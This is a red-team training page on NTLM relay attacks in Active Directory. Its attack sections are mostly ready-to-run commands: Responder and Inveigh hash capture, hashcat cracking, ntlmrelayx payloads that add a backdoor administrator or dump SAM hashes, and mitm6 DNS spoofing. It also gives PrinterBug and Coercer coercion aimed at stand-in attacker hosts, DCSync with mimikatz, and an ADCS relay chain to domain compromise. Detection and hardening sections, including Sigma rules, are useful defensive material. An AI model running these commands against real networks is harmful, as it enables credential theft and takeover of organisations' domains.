---
layout: training-page
title: "NTLM Relay Attacks — Red Team Academy"
module: "Active Directory"
tags:
  - llmnr
  - nbt-ns
  - responder
  - ntlmrelayx
  - mitm6
page_key: "ad-ntlm-relay"
render_with_liquid: false
---

# NTLM Relay Attacks

## Overview

NTLM relay attacks exploit the NTLM authentication protocol by intercepting authentication attempts and relaying them to other services before the victim can complete authentication directly. The attack chain typically starts with poisoning broadcast name resolution protocols (LLMNR, NBT-NS, mDNS) or DNS to capture authentication attempts, then relaying those credentials to target systems. This attack requires no prior credentials and is one of the most reliable ways to gain initial AD footholds.

![NTLM relay attack chain: victim authenticates to attacker via LLMNR poisoning, attacker relays to target SMB/LDAP server](/images/active-directory/ntlm-relay-flow.svg)  
*// ntlm relay flow — capture auth via LLMNR/NBT-NS, relay to target*

## LLMNR and NBT-NS Poisoning

Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are broadcast protocols that resolve hostnames when DNS fails. Any host on the local network can respond to these broadcasts — an attacker can respond with their own IP, causing the victim to authenticate to the attacker.

```
># How the attack works:
# 1. User types \\FILESERVER in Explorer (or a script/app does)
# 2. DNS fails to resolve FILESERVER
# 3. Windows sends LLMNR/NBT-NS broadcast: "Who is FILESERVER?"
# 4. Responder answers: "I am FILESERVER" — victim connects to attacker
# 5. Windows sends NTLMv2 challenge response (hash) to authenticate
# 6. Attacker captures hash → crack offline OR relay to another service

# Common triggers:
# - Mistyped UNC paths (\\FILESERVE instead of \\FILESERVER)
# - Applications hardcoded to non-existent shares
# - Group Policy with invalid paths
# - Browser attempting to authenticate to detected proxies
```

## Responder — Capture NTLMv2 Hashes

Responder poisons LLMNR, NBT-NS, and mDNS and presents fake authentication servers (SMB, HTTP, LDAP, etc.) to capture NTLMv2 hashes from victims on the local network segment.

```
># Basic Responder run (on your network interface):
sudo responder -I ens224
# -I: interface connected to target network
# Responder poisons LLMNR/NBT-NS and captures hashes

# Analyze mode only (no poisoning — just listen):
sudo responder -I ens224 -A

# Enable more protocol poisoners:
sudo responder -I ens224 -wv
# -w: WPAD rogue server
# -v: verbose

# View captured hashes:
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Crack captured NTLMv2 hashes with hashcat:
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
# Mode 5600 = NTLMv2 (NetNTLMv2)
# Example hash format: DOMAIN\User::DOMAIN:Challenge:Response

# IMPORTANT: Responder and ntlmrelayx cannot run simultaneously
# on the same interface — they both need port 445
# Turn off SMB/HTTP servers in Responder when using ntlmrelayx
```

## ntlmrelayx — Relay Captured Credentials

Rather than just capturing hashes to crack, relay them in real-time to a target system. If the target doesn't require SMB signing (most workstations don't), the relayed authentication succeeds. Impacket's `ntlmrelayx.py` handles the relay.

```
># Prepare: disable SMB and HTTP in Responder config
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off

# Build a targets file — SMB signing disabled hosts:
# Scan with nmap or nxc:
nxc smb 172.16.5.0/24 --gen-relay-list relay_targets.txt
# Outputs hosts with SMB signing disabled

# Start ntlmrelayx targeting the list:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
# Relays captured auth to all hosts in the list
# Default action: dump SAM database on each successful relay

# Start Responder (SMB/HTTP off):
sudo responder -I ens224 -rv
# Responder poisons → victim authenticates → ntlmrelayx relays

# When relay succeeds, you get SAM dump:
# [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
# Administrator:500:aad3b...:8846f...:::
```

## ntlmrelayx Payloads

ntlmrelayx can do more than dump SAM — it can execute commands, create users, or start an interactive shell on the relayed host.

```
># Execute command on relay target:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -c "net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add"

# Interactive SMB shell on relay target:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# Opens interactive smbclient shell when relay succeeds
# Connect to it: nc 127.0.0.1 11000

# LDAP relay (relay to domain controller — create user):
impacket-ntlmrelayx -t ldap://172.16.5.5 -smb2support --add-computer HACKER 'P@ssw0rd123!'
# Adds a computer account to the domain (useful for RBCD attacks)

# Relay to LDAPS (LDAP over SSL):
impacket-ntlmrelayx -t ldaps://172.16.5.5 -smb2support

# Dump domain hashes via relay to DC (if relaying Domain Admin creds):
impacket-ntlmrelayx -t smb://172.16.5.5 -smb2support --no-http-server
```

## IPv6 DNS Spoofing with mitm6

Most corporate Windows environments have IPv6 enabled but no IPv6 DNS server configured. mitm6 exploits this: it responds to DHCPv6 requests and assigns itself as the IPv6 DNS server, then answers all DNS queries with the attacker's IP. Victims send NTLM authentication to the attacker.

```
># mitm6 intercepts DHCPv6 and responds to IPv6 DNS queries
# Victims get attacker's IP as their DNS server for IPv6 lookups
# Windows prefers IPv6 over IPv4, so traffic comes to attacker

# Install mitm6:
pip3 install mitm6

# Start mitm6 targeting the domain:
sudo mitm6 -d corp.local
# -d: target AD domain
# mitm6 listens for DHCPv6 and WPAD requests

# Simultaneously run ntlmrelayx for LDAP relay:
impacket-ntlmrelayx -6 -t ldaps://172.16.5.5 -wh attacker-wpad.corp.local -l /tmp/loot
# -6: use IPv6
# -wh: WPAD hostname to respond to
# -l: loot directory

# Combined attack flow:
# 1. mitm6 → victims use attacker as DNS → request WPAD from attacker
# 2. Victims authenticate to attacker via NTLM (WPAD triggers auth)
# 3. ntlmrelayx relays credentials to LDAPS → dumps AD info or adds objects

# Verify mitm6 is capturing:
# Look for: "Got a DHCPv6 request from ..." and "Sent spoofed reply to ..."
```

## Inveigh — LLMNR/NBT-NS Poisoning from Windows

When operating from a Windows attack host, Inveigh performs the same LLMNR/NBT-NS poisoning as Responder. Both a PowerShell version and a compiled C# binary (InveighZero) are available. The C# version is actively maintained and supports an interactive console for real-time hash retrieval.

```
# PowerShell version:
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# Y = enable LLMNR spoofing, -NBNS Y = enable NetBIOS spoofing
# Hashes written to C:\Tools\ by default

# C# version (InveighZero) — runs with defaults (LLMNR + DNS + LDAP + SMB sniff):
.\Inveigh.exe

# While running, press ESC to enter interactive console:
# Useful console commands:
GET NTLMV2          # show all captured NTLMv2 hashes
GET NTLMV2UNIQUE    # one hash per unique user
GET NTLMV2USERNAMES # show usernames + source IPs
GET CLEARTEXT       # show any captured cleartext credentials
STOP                # stop Inveigh

# Stop from PowerShell (outside interactive console):
Stop-Inveigh
```

## Responder — Full Options Reference

```
# Key Responder flags:
sudo responder -I ens224              # basic — listen and poison all requests
sudo responder -I ens224 -A           # analyze mode (no poisoning — passive)
sudo responder -I ens224 -wf          # -w: WPAD rogue proxy, -f: fingerprint OS
sudo responder -I ens224 -v           # verbose (more data to console)

# Required ports (must be available):
# UDP: 137, 138, 53, 389, 1434, 5355, 5353
# TCP: 80, 135, 139, 445, 21, 25, 110, 587, 1433, 3128, 3141

# Hashes saved to: /usr/share/responder/logs/
# Format: SMB-NTLMv2-SSP-[CLIENT_IP].txt
# Also stored in SQLite DB (/usr/share/responder/Responder.db)

# Crack captured NTLMv2 hashes (mode 5600):
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.5.25.txt /usr/share/wordlists/rockyou.txt

# NOTE: Disable SMB/HTTP in Responder.conf when running ntlmrelayx:
# Edit /etc/responder/Responder.conf → SMB = Off, HTTP = Off
```

## Defenses Against NTLM Relay

Understanding defenses helps you explain findings and identify when signing is in place (which will block relay attacks).

```
># Check SMB signing status:
nxc smb 172.16.5.0/24 --gen-relay-list /dev/stdout
# Hosts with "signing:False" are relay targets
# Hosts with "signing:True" will reject relayed authentication

# Disable LLMNR (Group Policy):
# Computer Config → Admin Templates → Network → DNS Client
# → Turn off multicast name resolution → Enabled

# Disable NBT-NS (per adapter via PowerShell):
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled}
$adapters | ForEach-Object { $_.SetTcpipNetbios(2) }
# 2 = Disable NetBIOS over TCP/IP

# Enable SMB signing (Group Policy):
# Computer Config → Windows Settings → Security Settings
# → Local Policies → Security Options
# → Microsoft network client: Digitally sign communications (always) → Enabled

# Block NTLM entirely (high impact — test first):
# Computer Config → Windows Settings → Security Settings
# → Local Policies → Security Options
# → Network security: LAN Manager authentication level → NTLMv2 only, refuse LM and NTLM
```

## Print Spooler Bug (PrinterBug) and NTLM Relay

The Windows Print Spooler service (enabled by default on all Windows versions) can be abused to coerce a remote machine into authenticating to an attacker-controlled host. This "PrinterBug" uses RpcRemoteFindFirstPrinterChangeNotification(Ex) to force a target to authenticate — carrying a TGT in the process. Microsoft considers this "by design" and will not fix it.

```
># Relay PrinterBug auth to another DC for DCSync (requires SMB Signing disabled):

# Step 1: Configure ntlmrelayx to forward to DC2 and perform DCSync:
impacket-ntlmrelayx -t dcsync://DC2_IP -smb2support

# Step 2: Trigger the PrinterBug from Kali using dementor.py:
python3 ./dementor.py ATTACKER_IP TARGET_DC_IP -u bob -d domain.local -p Password123

# When successful, ntlmrelayx dumps domain credential hashes via DCSync

# Prevention: Disable Print Spooler on servers that don't need it.
# Or disable remote access via registry:
# HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers
# RegisterSpoolerRemoteRpcEndPoint = 2 (disabled for remote clients)

# Detection: Unexpected dropped outbound connections to ports 139/445 from DCs
# In DC relay attack: Event 4624 for DC$ account originating from attacker IP (not DC's IP)
```

## Coercing Attacks and Unconstrained Delegation

The Coercer tool exploits all known vulnerable RPC functions simultaneously to coerce a DC into authenticating back to an attacker-controlled machine. When combined with an Unconstrained Delegation server, the coerced DC's TGT is cached on that server and can be exported to perform DCSync or other domain-level attacks.

```
># Identify systems with Unconstrained Delegation:
Get-NetComputer -Unconstrained | select samaccountname
# DC$ are trusted by default — look for non-DC machines like SERVER01, WS001

# Step 1: On the UD server (already compromised) — monitor for new TGTs:
.\Rubeus.exe monitor /interval:1

# Step 2: From Kali — run Coercer to force DC to authenticate to the UD server:
Coercer -u bob -p Password123 -d domain.local -l ws001.domain.local -t dc1.domain.local

# Step 3: Rubeus shows new TGT for DC1$@DOMAIN.LOCAL — pass the ticket:
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Step 4: DCSync with the DC$ ticket:
.\mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator"

# Prevention options:
# 1. Third-party RPC firewall (zero networks) — block dangerous RPC OPNUMs
# 2. Block DCs from outbound ports 139/445 except to other DCs
```

## Coercer — Protocol Scanning & Filtering

Coercer unifies 20+ Windows RPC coercion techniques (MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP, etc.) into a single framework. Before blindly coercing, scan the target to discover which protocols are accessible — this avoids generating unnecessary noise from failed attempts.

```
# Scan a target to discover available coercion methods
coercer scan -u user -p password -d domain.local -t dc.domain.local

# Sample output:
# [+] MS-RPRN  — RpcOpenPrinter            — available
# [+] MS-DFSNM — NetrDfsAddStdRoot         — available
# [-] MS-EFSRPC — EfsRpcOpenFileRaw        — patched / unavailable

# Coerce using only a specific protocol
coercer -u user -p password -d domain.local \
  -t dc.domain.local -l attacker-ip \
  --filter-protocol-name MS-RPRN

# Try multiple specific protocols
coercer -u user -p password -d domain.local \
  -t dc.domain.local -l attacker-ip \
  --filter-protocol-name MS-RPRN,MS-DFSNM

# Bulk coercion from a target list
coercer -u user -p password -d domain.local \
  -tf targets.txt -l attacker-ip

# List all available coercion methods built into Coercer
coercer --list-methods
```

## Detection

### Event Log Sources
- **Event ID 4624 Logon Type 3** (Network Logon) — A successful relay produces a Type 3 NTLM logon on the target. The `IpAddress` field will show the attacker's relay host (ntlmrelayx server) rather than the victim's actual IP — an attacker IP appearing in logon events for accounts that should only log in from specific workstations is anomalous.
- **Event ID 4625** (Failed Logon) — Failed relay attempts (e.g., relay to a host with SMB signing enabled) generate Type 3 failures with NTLM; bursts of failures from the same source indicate relay tooling.
- **Event ID 5136** (Directory Service Object Modified) — LDAP relay attacks that add computer accounts or modify group membership leave AD object modification events on the DC.
- **Event ID 4741** (Computer Account Created) — ntlmrelayx LDAP relay with `--add-computer` creates a machine account; unexpected computer account creation is a high-signal indicator.

### Sysmon Events
- **Event ID 3 (Network Connection)** — Responder/Inveigh processes making connections on ports 137, 138, 445, 80 simultaneously. Also: ntlmrelayx outbound connections from the attacker's host to SMB/LDAP on targets.
- **Event ID 22 (DNS Query)** — LLMNR/NBT-NS poisoning will cause victim hosts to query for non-existent hostnames; observe broadcasts in DNS query logs or network captures. High volume of failed DNS lookups followed by NTLM auth to an unexpected host is a relay precursor pattern.
- **Event ID 1 (Process Creation)** — Responder, Inveigh, ntlmrelayx, or mitm6 process names on an attacker host.

### Key Indicators
- **NTLM authentication from unexpected source IPs** — a user's NTLM logon arriving at a server from an IP that is not the user's workstation; relay inserts the attacker between victim and target
- **SMB signing status** — hosts with `MessageSigningEnabled: False` and `MessageSigningRequired: False` are relay targets; audit your environment with `nxc smb <subnet> --gen-relay-list` and treat the output as a vulnerability list
- **LLMNR/NBT-NS broadcast traffic** — network captures showing LLMNR (UDP 5355) or NBT-NS (UDP 137) queries for hostnames that do not exist in DNS; these are the bait Responder responds to
- **DHCPv6 requests followed by IPv6 DNS assignments** — mitm6 responds to DHCPv6 (port 547); sudden IPv6 gateway/DNS changes on workstations indicate active mitm6 poisoning
- **Responder default User-Agent / fingerprints** — Responder's HTTP server has a distinctive response pattern; network IDS signatures for `Responder` tool responses exist in Suricata/Snort rulesets
- **SAM dump artifacts** — `Impacket-ntlmrelayx` default action dumps SAM to console; sensitive files like `samhashes.txt` or registry exports appearing on attacker-controlled paths

### Sigma Rule Concept
```yaml
# Sigma concept — NTLM relay indicator: auth source IP mismatch
title: Potential NTLM Relay — Authentication from Unexpected Source
status: experimental
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
    filter_expected_sources:
        IpAddress:
            - '10.0.0.0/8'       # replace with your legitimate admin IP ranges
            - '192.168.1.0/24'
    # Alert when source IP is NOT in the expected ranges for admin accounts
    condition: selection and not filter_expected_sources
falsepositives:
    - VPN users authenticating from external IPs
    - Cloud-based management tools
level: medium

# NBT-NS / LLMNR poisoning detection (network-based):
title: LLMNR Poisoning Indicator — High Volume Failed DNS with Subsequent NTLM Auth
# Requires network tap or DNS log correlation
# Alert: >5 LLMNR queries for non-existent hosts from a subnet followed by
#        NTLM auth to a host that has no prior relationship with the querying user
level: high
```

### EDR Behavior Alerts
- **Microsoft Defender for Identity (MDI)**: "NTLM Relay Attack" — MDI specifically detects when NTLM authentication for an account arrives from a host that is not the account's primary workstation, and correlates it with known relay tool patterns
- **CrowdStrike Falcon**: "NTLM Relay" / "Man-in-the-Middle" — detects relay tool execution and anomalous NTLM authentication chains
- **SentinelOne**: "Credential Relay" behavioral indicator — fires on tooling associated with Responder/ntlmrelayx process signatures and NTLM interception patterns
- **Microsoft Defender for Endpoint**: "Possible NTLM relay attack" when relay tools are detected or when authentication patterns indicate a relay chain

### Defensive Countermeasures
- **Enable SMB Signing (required, not just enabled)** — the single most effective control; relay attacks against hosts requiring signing fail immediately. Enable via GPO: Microsoft network server: Digitally sign communications (always) → Enabled
- **Disable LLMNR** — GPO: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution → Enabled
- **Disable NBT-NS** — Disable NetBIOS over TCP/IP per adapter via DHCP option 001 or PowerShell on each host
- **Disable IPv6 if not required** — prevents mitm6 DHCPv6 attacks; if IPv6 is needed, deploy a legitimate DHCPv6 server and configure DNS Guard on switches
- **Network IDS rules** — Suricata/Snort signatures for Responder HTTP responses, LLMNR flood patterns, and DHCPv6 rogue advertisements
- **LDAP signing and channel binding** — requires LDAP clients to sign requests; prevents relay to LDAP even when SMB signing is enforced elsewhere (KB4520412)
- **Tiered administration and network segmentation** — limit which workstations can authenticate to which servers; relay is only useful if the relayed credential has access to the target

## Coercer + ADCS WebDAV Relay Chain

When ADCS HTTP enrollment is available, coerce the DC over WebDAV (HTTP) instead of SMB. This avoids the SMB signing requirement and allows relaying the machine account authentication to the certificate authority to obtain a DC certificate — which can then be used to DCSync the entire domain.

```
# Full chain: Coercer → HTTP relay → ADCS certificate → domain compromise

# Step 1: Confirm ADCS web enrollment is running
curl -I http://ca-server/certsrv/

# Step 2: Terminal 1 — relay to ADCS HTTP endpoint
impacket-ntlmrelayx \
  -t http://ca-server/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController

# Step 3: Terminal 2 — coerce DC via WebDAV (HTTP auth, bypasses SMB signing)
coercer -u lowpriv -p password -d domain.local \
  -t dc.domain.local -l attacker-ip \
  --webdav-host attacker.com \
  --always-continue

# Step 4: ntlmrelayx obtains a base64-encoded DC certificate
# Save it to dc.pfx

# Step 5: Authenticate as DC using the certificate
certipy auth -pfx dc.pfx -dc-ip dc-ip

# Step 6: DC machine account TGT obtained — use for DCSync via S4U2Self
impacket-secretsdump -k -no-pass dc.domain.local

# GOAD example — from low-priv samwell.tarly to domain compromise:
# Terminal 1:
impacket-ntlmrelayx \
  -t http://192.168.56.23/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Terminal 2:
coercer -u samwell.tarly -p Heartsbane \
  -d north.sevenkingdoms.local \
  -t winterfell.north.sevenkingdoms.local \
  -l 192.168.56.100 \
  --webdav-host 192.168.56.100 --always-continue
```
